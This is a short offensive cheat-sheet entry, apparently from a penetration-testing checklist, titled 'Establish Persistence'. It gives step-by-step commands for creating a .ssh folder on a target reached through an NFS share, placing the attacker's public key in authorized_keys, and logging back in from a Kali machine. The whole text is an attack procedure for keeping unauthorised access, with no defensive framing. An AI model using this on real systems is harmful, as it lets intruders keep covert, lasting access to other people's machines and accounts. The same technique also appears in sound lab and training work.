# Establish Persistence
If ssh open, you can create a .ssh folder in your user folder and drop a public key there for easy access later on.
```
#target# mkdir [attacker file system NFS location from #2]/.ssh
#attacker# cat ~/.ssh/id_rsa.pub | clip
#target# cd .ssh; vim authorized_keys
#target# copy public key into this file and save it.
#kali#ssh -i ~/.ssh/id_rsa [user name]@[IP]
```
